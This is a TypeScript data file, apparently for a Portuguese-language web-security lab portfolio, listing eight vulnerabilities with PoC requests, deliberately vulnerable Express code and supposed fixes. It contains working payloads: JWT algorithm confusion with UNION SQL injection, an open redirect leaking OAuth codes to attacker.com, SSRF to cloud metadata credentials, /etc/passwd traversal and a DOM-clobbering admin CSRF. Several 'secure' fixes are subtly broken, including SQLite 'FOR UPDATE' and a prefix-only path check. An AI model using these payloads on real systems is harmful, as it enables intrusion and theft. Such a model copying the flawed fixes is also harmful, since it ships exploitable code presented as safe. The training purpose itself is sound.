export interface SecurityLab {
  id: string;
  title: string;
  roadmapPhase: string;
  description: string;
  vulnerabilities: string[];
  targetStack: string[];
  status: "completed" | "planned";
  severity: "CRITICAL" | "HIGH" | "MEDIUM" | "LOW";
  cvss: number;
  cwe: string;
  impact: string;
  pocSteps: string[];
  pocRequest: string;
  pocResponse: string;
  vulnCode: string;
  secureCode: string;
  writeupUrl?: string;
  githubUrl?: string;
}

export const labs: SecurityLab[] = [
  {
    id: "jwt-sqli",
    title: "JWT Algorithm Confusion to SQLite Injection",
    roadmapPhase: "Fase 02 — M04: SQL Injection (SQLi)",
    description: "Bypass de assinatura de JWT manipulando o header alg para HS256 com chave pública simétrica, explorando SQL Injection no campo claim 'sub' para extrair credenciais.",
    vulnerabilities: ["Broken Authentication (JWT)", "SQL Injection (UNION-based)"],
    targetStack: ["Express", "SQLite", "JSONWebToken"],
    status: "planned",
    severity: "CRITICAL",
    cvss: 9.8,
    cwe: "CWE-89 & CWE-347",
    impact: "Comprometimento total da confidencialidade do banco de dados, permitindo a extração de hashes de senhas administrativas e o sequestro completo de sessões de qualquer usuário.",
    pocSteps: [
      "Obter a chave pública RSA exposta no endpoint '/api/keys'.",
      "Forjar um token JWT alterando o algoritmo no header de RS256 para HS256.",
      "No payload do token, injetar a query SQLi no claim 'sub' (ex: 1' UNION SELECT null, username, password FROM users --).",
      "Assinar simetricamente o token usando a chave pública obtida como segredo HMAC.",
      "Enviar a requisição GET para '/api/users/profile' contendo o token no cabeçalho Authorization: Bearer <payload>."
    ],
    pocRequest: `GET /api/users/profile HTTP/1.1
Host: vulnerable-lab.local
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxJyBVTklPTiBTRUxFQ1QgbnVsbCwgdXNlcm5hbWUsIHBhc3N3b3JkIEZST00gdXNlcnMgLS0iLCJpYXQiOjE1MTYyMzkwMjJ9.signature_hash
Accept: application/json`,
    pocResponse: `HTTP/1.1 200 OK
Content-Type: application/json
Connection: close

{
  "id": "1' UNION SELECT null, username, password FROM users --",
  "username": "admin",
  "email": "$2b$12$K7vJ2yS5Uv9zL8x2yQv7uO0nK3xR5VvY7pL8z9x2yQv7uO0nK3xR5"
}`,
    vulnCode: `// VULNERABILIDADE: Aceita algoritmo do token sem validação estrita
const jwt = require('jsonwebtoken');
const publicKey = fs.readFileSync('public.key');

app.get('/api/users/profile', (req, res) => {
  const token = req.headers.authorization.split(' ')[1];
  
  // A biblioteca verifica usando a chave pública, mas aceita HS256 assinado com ela
  const decoded = jwt.verify(token, publicKey); 
  
  // SQL Injection direto por concatenação do claim 'sub'
  const sql = "SELECT * FROM users WHERE id = '" + decoded.sub + "'";
  db.get(sql, [], (err, row) => {
    res.json(row);
  });
});`,
    secureCode: `// CORREÇÃO: Forçar algoritmo de verificação e usar queries parametrizadas
const jwt = require('jsonwebtoken');
const publicKey = fs.readFileSync('public.key');

app.get('/api/users/profile', (req, res) => {
  try {
    const token = req.headers.authorization.split(' ')[1];
    
    // Força a validação usando apenas o algoritmo assimétrico esperado
    const decoded = jwt.verify(token, publicKey, { algorithms: ['RS256'] });
    
    // Consulta parametrizada segura contra injeção SQL
    const sql = "SELECT id, username, email FROM users WHERE id = ?";
    db.get(sql, [decoded.sub], (err, row) => {
      if (err) return res.status(500).json({ error: err.message });
      res.json(row);
    });
  } catch (err) {
    res.status(401).json({ error: "Token inválido ou expirado" });
  }
});`
  },
  {
    id: "oauth-takeover",
    title: "Federated OAuth & JWT Identity Takeover",
    roadmapPhase: "Fase 02 — M06: Autenticação & Gerenciamento de Sessão",
    description: "Exploração de Open Redirect em regex vulnerável no redirect_uri de login federado para sequestro de Authorization Codes e forjamento de JWTs usando cabeçalho 'jku'.",
    vulnerabilities: ["Broken Authentication", "Open Redirect", "Insecure OAuth Flows"],
    targetStack: ["Express", "OAuth 2.0", "JWKS"],
    status: "planned",
    severity: "HIGH",
    cvss: 8.5,
    cwe: "CWE-601 & CWE-347",
    impact: "Sequestro completo de contas de usuários legítimos que utilizam o Single Sign-On (SSO) do portal, permitindo login administrativo e bypass de autenticação federada.",
    pocSteps: [
      "Identificar o fluxo OAuth '/api/auth/oauth/authorize?redirect_uri=...'.",
      "Bypassar a validação da regex de redirect_uri fornecendo um redirecionamento malicioso (ex: https://trusted-client.com/callback/../../attacker.com).",
      "Capturar o código de autenticação enviado pelo Identity Provider no servidor controlado pelo atacante.",
      "Criar e assinar um token JWT com as claims falsificadas e apontar o cabeçalho 'jku' para as chaves públicas JWKS controladas pelo atacante.",
      "Autenticar-se no sistema alvo com identidade adulterada de administrador."
    ],
    pocRequest: `GET /api/auth/oauth/authorize?client_id=crm_app&redirect_uri=https://trusted-client.com/callback/../../attacker.com/steal&response_type=code HTTP/1.1
Host: identity-provider.local
Cookie: session=valid_user_session`,
    pocResponse: `HTTP/1.1 302 Found
Location: https://attacker.com/steal?code=AUTH_CODE_SEQUESTRADO
Connection: close`,
    vulnCode: `// VULNERABILIDADE: Validação fraca da URI de redirecionamento via regex imperfeita
app.get('/api/auth/oauth/authorize', (req, res) => {
  const { redirect_uri } = req.query;
  
  // A regex apenas verifica se a URI contém o domínio, mas não valida caminhos relativos
  if (!redirect_uri.match(/https:\\/\\/trusted-client\\.com/)) {
    return res.status(400).send("Invalid Redirect URI");
  }
  
  res.redirect(redirect_uri + "?code=" + generateCode());
});`,
    secureCode: `// CORREÇÃO: Validação estrita contra uma whitelist de URIs exatas
const ALLOWED_REDIRECT_URIS = [
  "https://trusted-client.com/callback",
  "https://trusted-client.com/oauth-callback"
];

app.get('/api/auth/oauth/authorize', (req, res) => {
  const { redirect_uri } = req.query;
  
  // Compara com a lista de URIs exatas permitidas
  if (!ALLOWED_REDIRECT_URIS.includes(redirect_uri)) {
    return res.status(400).send("Invalid Redirect URI");
  }
  
  res.redirect(redirect_uri + "?code=" + generateCode());
});`
  },
  {
    id: "ssrf-metadata",
    title: "Blind SSRF to Cloud Metadata Takeover",
    roadmapPhase: "Fase 02 — M07: SSRF",
    description: "SSRF Cego em rotas de processamento de webhooks/URLs externas para escanear a rede interna Docker e extrair tokens temporários de serviços de metadados de nuvem (AWS/GCP).",
    vulnerabilities: ["Server-Side Request Forgery (SSRF)", "Information Disclosure"],
    targetStack: ["Express", "Docker Internal Network", "AWS Metadata API"],
    status: "planned",
    severity: "HIGH",
    cvss: 8.6,
    cwe: "CWE-918",
    impact: "Exposição de credenciais de infraestrutura em nuvem (chaves temporárias IAM) a partir do servidor de metadados local, possibilitando escalação de privilégios e controle dos recursos da nuvem da empresa.",
    pocSteps: [
      "Enviar requisição HTTP POST para o endpoint '/api/webhooks' passando uma URL interna controlada na propriedade 'url'.",
      "Tentar acessar o IP de metadados da nuvem da AWS (http://169.254.169.254/latest/meta-data/iam/security-credentials/).",
      "Monitorar a resposta do webhook ou os tempos de resposta (SSRF Cego) para exfiltrar o JSON com AccessKeyId, SecretAccessKey e Token."
    ],
    pocRequest: `POST /api/webhooks HTTP/1.1
Host: crm-server.local
Content-Type: application/json

{
  "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role"
}`,
    pocResponse: `HTTP/1.1 200 OK
Content-Type: application/json
Connection: close

{
  "status": "success",
  "data": {
    "AccessKeyId": "ASIAIOSFODNN7EXAMPLE",
    "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
    "Token": "IQoJb3JpZ2luX2VjEOb..."
  }
}`,
    vulnCode: `// VULNERABILIDADE: Faz a requisição para qualquer URL enviada pelo usuário
const axios = require('axios');

app.post('/api/webhooks', async (req, res) => {
  const { url } = req.body;
  
  // Nenhuma validação se a URL aponta para a rede interna ou metadados
  const response = await axios.get(url);
  res.json({ status: "success", data: response.data });
});`,
    secureCode: `// CORREÇÃO: Validar domínio e bloquear IPs de rede privada/metadados
const axios = require('axios');
const ipRangeCheck = require('ip-range-check');
const dns = require('dns').promises;

app.post('/api/webhooks', async (req, res) => {
  const { url } = req.body;
  
  try {
    const parsedUrl = new URL(url);
    const addresses = await dns.resolve4(parsedUrl.hostname);
    const resolvedIp = addresses[0];
    
    // Lista de IPs privados/loopback e metadados a serem bloqueados
    const privateRanges = ['127.0.0.0/8', '10.0.0.0/8', '172.16.0.0/12', '192.168.0.0/16', '169.254.169.254/32'];
    
    if (ipRangeCheck(resolvedIp, privateRanges)) {
      return res.status(403).json({ error: "Acesso a IPs privados não permitido" });
    }
    
    const response = await axios.get(url, { timeout: 3000 });
    res.json({ status: "success", data: response.data });
  } catch (err) {
    res.status(400).json({ error: "URL inválida ou inacessível" });
  }
});`
  },
  {
    id: "bola-idor",
    title: "BOLA/IDOR Invoice Exfiltration Portal",
    roadmapPhase: "Fase 02 — M09: IDOR & Controle de Acesso",
    description: "Vulnerabilidade BOLA (IDOR) em rotas de download de faturas, acessando e baixando documentos confidenciais de terceiros alterando sequencialmente IDs na URL.",
    vulnerabilities: ["Broken Object Level Authorization (BOLA)", "Insecure Direct Object References (IDOR)"],
    targetStack: ["Express", "SQLite"],
    status: "planned",
    severity: "HIGH",
    cvss: 7.5,
    cwe: "CWE-639",
    impact: "Exfiltração em massa de faturas de outros clientes (incluindo valores, nomes e endereços) através do incremento sequencial simples do parâmetro de ID.",
    pocSteps: [
      "Efetuar o login como usuário comum e visualizar a própria fatura (ex: /api/v1/documents/12).",
      "Alterar o ID da fatura na requisição para um número menor (ex: 1, 2, 3).",
      "Verificar que a API retorna o PDF e dados cadastrais de outra empresa/usuário sem validação de dono de sessão."
    ],
    pocRequest: `GET /api/v1/documents/1 HTTP/1.1
Host: ecommerce-api.local
Authorization: Bearer client_session_token`,
    pocResponse: `HTTP/1.1 200 OK
Content-Type: application/json
Connection: close

{
  "id": 1,
  "client_name": "Administrador Global",
  "total_amount": 54000.00,
  "invoice_url": "https://s3.local/invoices/secret_admin_invoice.pdf"
}`,
    vulnCode: `// VULNERABILIDADE: Confia no ID fornecido pelo cliente sem verificar propriedade
app.get('/api/v1/documents/:id', (req, res) => {
  const docId = req.params.id;
  
  // Apenas consulta o banco de dados diretamente usando o ID
  db.get('SELECT * FROM documents WHERE id = ?', [docId], (err, row) => {
    if (!row) return res.status(404).send("Document not found");
    res.json(row);
  });
});`,
    secureCode: `// CORREÇÃO: Validar a propriedade do recurso através da sessão do usuário
app.get('/api/v1/documents/:id', (req, res) => {
  const docId = req.params.id;
  const userId = req.user.id; // Usuário extraído com segurança da sessão/JWT
  
  // Restringe a query no banco de dados para buscar apenas se pertencer ao usuário
  db.get('SELECT * FROM documents WHERE id = ? AND user_id = ?', [docId, userId], (err, row) => {
    if (err) return res.status(500).json({ error: err.message });
    if (!row) return res.status(403).json({ error: "Não autorizado a acessar este documento" });
    res.json(row);
  });
});`
  },
  {
    id: "dom-clobbering",
    title: "Stored DOM Clobbering to Zero-Click Admin Takeover",
    roadmapPhase: "Fase 03 — M11: XSS (Cross-Site Scripting)",
    description: "Injeção HTML persistente explorando falha no sanitizador que aceita IDs/Names customizados, permitindo poluir propriedades globais do objeto window para CSRF administrativo sem clique.",
    vulnerabilities: ["Stored DOM-based XSS", "DOM Clobbering", "CSRF"],
    targetStack: ["Express", "React", "HTML DOM"],
    status: "planned",
    severity: "HIGH",
    cvss: 8.2,
    cwe: "CWE-79 & CWE-116",
    impact: "Execução remota de script com privilégios administrativos. Se um moderador abrir a postagem adulterada, o script executa solicitações administrativas silenciosamente.",
    pocSteps: [
      "Criar uma publicação no fórum injetando um código HTML que define um elemento com ID que sobrescreve uma configuração global (DOM Clobbering).",
      "Exemplo de injeção: <a id='config' href='javascript:fetch(\"/api/v1/admin/invite\", {method:\"POST\"})'></a>.",
      "Aguardar que o administrador visualize a postagem; o script do cliente lerá o link e acionará a requisição em background."
    ],
    pocRequest: `POST /api/posts HTTP/1.1
Host: support-forum.local
Content-Type: application/json
Authorization: Bearer user_token

{
  "content": "<a id='config' href='javascript:fetch(\\"/api/v1/admin/invite\\")'></a>"
}`,
    pocResponse: `HTTP/1.1 201 Created
Content-Type: application/json
Connection: close

{
  "id": 85,
  "content": "<a id='config' href='javascript:fetch(\\"/api/v1/admin/invite\\")'></a>"
}`,
    vulnCode: `// VULNERABILIDADE: Sanitização ignora atributos como ID e Name
const DOMPurify = require('dompurify');

function renderPost(content) {
  // Configuração padrão que permite atributos ID e NAME, levando ao Clobbering
  const cleanHTML = DOMPurify.sanitize(content);
  document.getElementById('post-body').innerHTML = cleanHTML;
  
  // Se window.config existe, injeta ou executa
  if (window.config) {
    executeAction(window.config.href);
  }
}`,
    secureCode: `// CORREÇÃO: Utilizar configurações rígidas de sanitização bloqueando atributos perigosos
const DOMPurify = require('dompurify');

function renderPost(content) {
  // Remove atributos 'id' e 'name' para impossibilitar o DOM Clobbering
  const cleanHTML = DOMPurify.sanitize(content, {
    FORBID_ATTR: ['id', 'name'],
    KEEP_CONTENT: true
  });
  document.getElementById('post-body').innerHTML = cleanHTML;
  
  // Utiliza uma variável de ambiente do build estável e imutável para a configuração
  const config = process.env.NEXT_PUBLIC_APP_CONFIG;
  executeAction(config);
}`
  },
  {
    id: "mass-assignment",
    title: "Mass Assignment Profile Escalation",
    roadmapPhase: "Fase 04 — M23: API Testing & GraphQL",
    description: "Mass Assignment em endpoint JSON de atualização cadastral que mescla objetos sem sanitização ou DTO, permitindo que usuários comuns alterem seu próprio nível de privilégio.",
    vulnerabilities: ["Mass Assignment", "Broken Object Level Authorization"],
    targetStack: ["Express", "SQLite", "GraphQL"],
    status: "planned",
    severity: "HIGH",
    cvss: 8.0,
    cwe: "CWE-915",
    impact: "Escalação vertical de privilégios simples de usuário comum para administrador modificando diretamente os campos de controle no banco de dados.",
    pocSteps: [
      "Capturar a requisição PUT enviada para '/api/profile/update'.",
      "Inserir a chave administrativa 'is_admin': true ou 'role': 'admin' no corpo JSON.",
      "Enviar a requisição e verificar que o perfil atualizado agora possui privilégios de administrador."
    ],
    pocRequest: `PUT /api/profile/update HTTP/1.1
Host: company-portal.local
Content-Type: application/json
Authorization: Bearer employee_token

{
  "name": "João Silva",
  "email": "joao@company.local",
  "role": "admin"
}`,
    pocResponse: `HTTP/1.1 200 OK
Content-Type: application/json
Connection: close

{
  "success": true,
  "user": {
    "id": 14,
    "name": "João Silva",
    "email": "joao@company.local",
    "role": "admin"
  }
}`,
    vulnCode: `// VULNERABILIDADE: Gravação em lote diretamente do corpo da requisição
app.put('/api/profile/update', (req, res) => {
  const updates = req.body; // Permite qualquer campo inserido no JSON pelo usuário
  const userId = req.user.id;
  
  const setClause = Object.keys(updates).map(k => k + " = ?").join(', ');
  const values = Object.values(updates);
  
  db.run("UPDATE users SET " + setClause + " WHERE id = ?", [...values, userId], (err) => {
    res.json({ success: true });
  });
});`,
    secureCode: `// CORREÇÃO: Utilizar DTO ou desestruturar estritamente os campos permitidos
app.put('/api/profile/update', (req, res) => {
  const userId = req.user.id;
  
  // Apenas campos permitidos para alteração manual pelo usuário são extraídos
  const { name, email, avatar_url } = req.body;
  
  db.run(
    "UPDATE users SET name = ?, email = ?, avatar_url = ? WHERE id = ?",
    [name, email, avatar_url, userId],
    (err) => {
      if (err) return res.status(500).json({ error: err.message });
      res.json({ success: true, message: "Perfil atualizado!" });
    }
  );
});`
  },
  {
    id: "path-traversal-exfil",
    title: "File Download Path Traversal",
    roadmapPhase: "Fase 04 — M14: Path Traversal Avançado",
    description: "Bypass de validação de caminhos relativos em rotas de download de mídia, permitindo ler arquivos internos do SO (/etc/passwd) ou baixar a base de dados SQLite.",
    vulnerabilities: ["Path Traversal", "Local File Inclusion (LFI)"],
    targetStack: ["Express", "Node.js File System"],
    status: "planned",
    severity: "HIGH",
    cvss: 7.5,
    cwe: "CWE-22",
    impact: "Exfiltração de arquivos sensíveis de configuração do sistema operacional ou download completo do banco de dados da aplicação.",
    pocSteps: [
      "Acessar o endpoint de download de documentos: '/api/download?file=brochure.pdf'.",
      "Fornecer caracteres de travessia '../' para apontar ao diretório pai (ex: file=../../../../etc/passwd).",
      "Verificar que a API lê e retorna o arquivo de senhas do Linux do host local."
    ],
    pocRequest: `GET /api/download?file=../../../../etc/passwd HTTP/1.1
Host: report-downloader.local
Connection: close`,
    pocResponse: `HTTP/1.1 200 OK
Content-Type: text/plain
Connection: close

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin`,
    vulnCode: `// VULNERABILIDADE: Concatena o nome do arquivo recebido sem validar o caminho final
const path = require('path');

app.get('/api/download', (req, res) => {
  const { file } = req.query;
  const filePath = path.join(__dirname, 'public/files', file);
  
  // Lê e envia o arquivo do caminho resolvido diretamente
  res.sendFile(filePath);
});`,
    secureCode: `// CORREÇÃO: Validar que o caminho final resolvido reside na pasta autorizada
const path = require('path');

app.get('/api/download', (req, res) => {
  const { file } = req.query;
  const safeDirectory = path.join(__dirname, 'public/files');
  const filePath = path.join(safeDirectory, file);
  
  // Valida se o caminho absoluto do arquivo começa com a pasta permitida
  if (!filePath.startsWith(safeDirectory)) {
    return res.status(403).json({ error: "Acesso proibido fora da pasta pública" });
  }
  
  res.sendFile(filePath);
});`
  },
  {
    id: "coupon-concurrency",
    title: "E-Commerce Coupon Concurrency (Race Condition)",
    roadmapPhase: "Fase 04 — M22: Race Conditions",
    description: "Condição de corrida assíncrona na aplicação de cupons promocionais de uso único, permitindo acúmulo de descontos e zeramento de compras através de requisições concorrentes.",
    vulnerabilities: ["Race Conditions", "Business Logic Flaw"],
    targetStack: ["Express", "SQLite", "HTTP/2"],
    status: "planned",
    severity: "HIGH",
    cvss: 8.1,
    cwe: "CWE-367",
    impact: "Prejuízo financeiro de e-commerce pela aplicação ilimitada de descontos únicos, permitindo fechar pedidos com valores incorretos.",
    pocSteps: [
      "Adicionar um item de alto valor ao carrinho de compras.",
      "Configurar um script multithreading para disparar 20 requisições simultâneas aplicando o cupom 'PROMO100'.",
      "As requisições se aproveitam da latência do banco de dados e são aplicadas antes que o cupom seja marcado como 'resgatado'.",
      "Finalizar a compra a preço zerado."
    ],
    pocRequest: `POST /api/cart/coupon HTTP/1.1
Host: shop.local
Content-Type: application/json
Authorization: Bearer customer_token

{
  "coupon": "PROMO100"
}`,
    pocResponse: `HTTP/1.1 200 OK
Content-Type: application/json
Connection: close

{
  "applied": true,
  "discount": 100,
  "cart_total": 0.00
}`,
    vulnCode: `// VULNERABILIDADE: Operação assíncrona de verificação e gravação (TOC/TOU) sem Lock
app.post('/api/cart/coupon', async (req, res) => {
  const { coupon } = req.body;
  
  const c = await db.get("SELECT * FROM coupons WHERE code = ? AND used = 0", [coupon]);
  if (!c) return res.status(400).send("Coupon already used");
  
  // Latência assíncrona permite que outras requisições cheguem aqui antes do UPDATE
  await applyDiscount(req.user.id, c.value);
  await db.run("UPDATE coupons SET used = 1 WHERE id = ?", [c.id]);
  
  res.json({ applied: true });
});`,
    secureCode: `// CORREÇÃO: Utilizar transações atômicas de banco de dados ou lock mutex
app.post('/api/cart/coupon', async (req, res) => {
  const { coupon } = req.body;
  
  // Executa uma transação de escrita exclusiva para garantir atomicidade
  db.serialize(async () => {
    db.run("BEGIN TRANSACTION");
    
    db.get(
      "SELECT * FROM coupons WHERE code = ? AND used = 0 FOR UPDATE", 
      [coupon], 
      async (err, row) => {
        if (!row) {
          db.run("ROLLBACK");
          return res.status(400).send("Cupom indisponível");
        }
        
        await applyDiscount(req.user.id, row.value);
        db.run("UPDATE coupons SET used = 1 WHERE id = ?", [row.id]);
        db.run("COMMIT");
        
        res.json({ applied: true });
      }
    );
  });
});`
  }
];
